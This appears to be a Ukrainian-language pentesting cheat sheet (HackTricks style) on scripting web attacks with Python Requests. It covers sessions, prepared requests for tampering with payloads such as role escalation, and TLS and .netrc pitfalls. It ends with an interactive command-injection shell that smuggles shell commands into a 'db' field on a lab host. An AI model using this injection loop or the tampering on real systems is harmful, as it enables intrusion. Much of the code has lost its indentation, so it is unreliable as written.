# Вебзапити

{{#include ../../banners/hacktricks-training.md}}

## Python Requests

У цих прикладах використовуються задокументовані аргументи запитів Requests, властивості відповідей, кортежі multipart-файлів і сесії.<sup>[[1]](#references)</sup> Приклади з `verify=False` вимикають перевірку TLS-сертифіката, тому їх слід обмежити контрольованим тестуванням.<sup>[[1]](#references)</sup>
```python
import random
import re
import string

import requests

url = "http://example.com:80/some/path.php"
params = {"p1":"value1", "p2":"value2"}
headers = {"User-Agent": "fake User Agent", "Fake header": "True value"}
cookies = {"PHPSESSID": "1234567890abcdef", "FakeCookie123": "456"}
proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

#Regular Get requests sending parameters (params)
gr = requests.get(url, params=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True)

code = gr.status_code
ret_headers = gr.headers
body_byte = gr.content
body_text = gr.text
ret_cookies = gr.cookies
is_redirect = gr.is_redirect
is_permanent_redirect = gr.is_permanent_redirect
float_seconds = gr.elapsed.total_seconds()

#Regular Post requests sending parameters (data)
pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Json Post requests sending parameters(json)
pr = requests.post(url, json=params, headers=headers, cookies=cookies, verify=False, allow_redirects=True, proxies=proxies)

#Post request sending a file(files) and extra values
filedict = {"<FILE_PARAMETER_NAME>" : ("filename.png", open("filename.png", 'rb').read(), "image/png")}
pr = requests.post(url, data={"submit": "submit"}, files=filedict)

#Useful for presenting results in boolean/time based injections
print(f"\rflag: {flag}{char}", end="")




##### Example Functions
target = "http://10.10.10.10:8000"
proxies = {}
s = requests.Session()

def register(username, password):
resp = s.post(target + "/register", data={"username":username, "password":password, "submit": "Register"}, proxies=proxies, verify=0)
return resp

def login(username, password):
resp = s.post(target + "/login", data={"username":username, "password":password, "submit": "Login"}, proxies=proxies, verify=0)
return resp

def get_info(name):
resp = s.post(target + "/projects", data={"name":name, }, proxies=proxies, verify=0)
guid = re.match('<a href="\/info\/([^"]*)">' + name + '</a>', resp.text)[1]
return guid

def upload(guid, filename, data):
resp = s.post(target + "/upload/" + guid, data={"submit": "upload"}, files={"file":(filename, data)}, proxies=proxies, verify=0)
guid = re.match('"' + filename + '": "([^"]*)"', resp.text)[1]
return guid

def json_search(guid, search_string):
resp = s.post(target + "/api/search/" + guid + "/", json={"search":search_string}, headers={"Content-Type": "application/json"}, proxies=proxies, verify=0)
return resp.json()

def get_random_string(guid, path):
return ''.join(random.choice(string.ascii_letters) for i in range(10))
```
## Підготовлені запити для керування payload

`PreparedRequest` надає доступ до фінальної URL-адреси, заголовків і кодованого тіла перед його надсиланням. Створюйте його за допомогою `Session.prepare_request()` (а не `Request.prepare()`), коли потрібно застосувати cookies або автентифікацію сесії; якщо підготовлений потік також має враховувати налаштування proxy/CA із середовища, явно об’єднайте їх за допомогою `merge_environment_settings()`.<sup>[[1]](#references)</sup>
```python
s = requests.Session()
req = requests.Request("POST", url, data=b"role=user")
prepped = s.prepare_request(req)
prepped.body = b"role=admin%26debug%3D1"
prepped.headers["Content-Length"] = str(len(prepped.body))

env = s.merge_environment_settings(prepped.url, {}, None, None, None)
r = s.send(prepped, timeout=(3.05, 15), allow_redirects=False, **env)
print(r.request.headers)
print(r.request.body)
```
Це корисно, коли exploit потребує нестандартного кодування або коли потрібно порівняти payload, сформований із запитом, збереженим у `response.request`. Це не примітив для raw-HTTP: Requests зберігає заголовки у відображенні без урахування регістру, тому присвоєння дубльованого імені замінює попереднє значення. Для некоректних рядків запиту або окремих дубльованих полів `Content-Length`/`Transfer-Encoding`, необхідних для [HTTP request-smuggling tests](../../pentesting-web/http-request-smuggling/README.md), використовуйте sender нижчого рівня.<sup>[[1]](#references)</sup>

## Ізоляція сесії, неявні облікові дані та стан TLS

Сесія за замовчуванням довіряє конфігурації середовища. Якщо явну автентифікацію не вказано, Requests може отримати Basic облікові дані з `.netrc`; також він може імпортувати конфігурацію proxy та шляхи до набору CA із змінних середовища. Для скриптів, які отримують дані з URL, контрольованих attacker, вимкніть ці неявні джерела та явно налаштуйте лише призначені proxy/CA для lab. Версії до 2.32.4 могли вибрати облікові дані `.netrc` для неправильного хоста, якщо їм передати URL зі зловмисно сформованими даними, тоді як `Session.trust_env = False` є документованим workaround, коли оновлення неможливе.<sup>[[1]](#references)[[4]](#references)</sup>
```python
s = requests.Session()
s.trust_env = False
s.verify = "/path/to/lab-ca.pem"  # Prefer a lab CA over verify=False
s.proxies = {
"http": "http://127.0.0.1:8080",
"https": "http://127.0.0.1:8080",
}
```
Тримайте сесію, яка використовує `verify=False`, окремо від сесій, що потребують перевіреного TLS. У Requests до версії 2.32.0 з’єднання, спочатку відкрите з `verify=False`, могло повторно використовуватися для подальших запитів до того самого origin, навіть якщо для цих запитів було вказано `verify=True`; оновлення виправляє цю проблему зі станом пулу, але ізоляція також спрощує аудит exploit-скриптів.<sup>[[5]](#references)</sup>

## Надійні цикли експлуатації

Requests не має тайм-ауту за замовчуванням. Тайм-аут `(connect, read)` не є загальним обмеженням часу виконання: компонент `read` обмежує час, протягом якого клієнт очікує між отриманням байтів. Вимикайте автоматичні перенаправлення, коли ціль контролює `Location`, а потім перевіряйте кожен перехід перед надсиланням нового запиту; якщо перенаправлення ввімкнено, перевіряйте `response.history`. Для великих або ворожих відповідей використовуйте `stream=True`, перебирайте дані обмеженими фрагментами та закривайте відповідь за допомогою контекстного менеджера, щоб pooled connection було звільнено.<sup>[[1]](#references)</sup>
```python
limit = 2 * 1024 * 1024
body = bytearray()

with s.get(url, timeout=(3.05, 10), allow_redirects=False, stream=True) as r:
print(r.status_code, r.headers.get("Location"))
for chunk in r.iter_content(64 * 1024):
if len(body) + len(chunk) > limit:
raise ValueError("response exceeds limit")
body.extend(chunk)
```
## Команда Python для експлуатації RCE

Командний цикл успадковує `Cmd` у Python; його метод `default` обробляє нерозпізнані префікси команд, `cmdloop` розподіляє рядки введення, а `re.DOTALL` дає змогу шаблону вилучення охоплювати переноси рядків.<sup>[[2]](#references)[[3]](#references)</sup>
```python
import requests
import re
from cmd import Cmd

class Terminal(Cmd):
prompt = "Inject => "

def default(self, args):
output = RunCmd(args)
print(output)

def RunCmd(cmd):
data = { 'db': f'lol; echo -n "MYREGEXP"; {cmd}; echo -n "MYREGEXP2"' }
r = requests.post('http://10.10.10.127/select', data=data)
page = r.text
m = re.search('MYREGEXP(.*?)MYREGEXP2', page, re.DOTALL)
if m:
return m.group(1)
else:
return 1


term = Terminal()
term.cmdloop()
```
## References

- [1] [Інтерфейс розробника Requests](https://requests.readthedocs.io/en/stable/api/)
- [2] [Python `cmd` — підтримка інтерпретаторів командного рядка](https://docs.python.org/3/library/cmd.html)
- [3] [Python `re` — операції з регулярними виразами](https://docs.python.org/3/library/re.html)
- [4] [Requests: витік облікових даних `.netrc` через шкідливі URL-адреси](https://github.com/psf/requests/security/advisories/GHSA-9hjg-9r4m-mvj7)
- [5] [Об'єкт `Session` Requests не перевіряє запити після виконання першого запиту з `verify=False`](https://github.com/psf/requests/security/advisories/GHSA-9wx4-h78v-vm56)
{{#include ../../banners/hacktricks-training.md}}
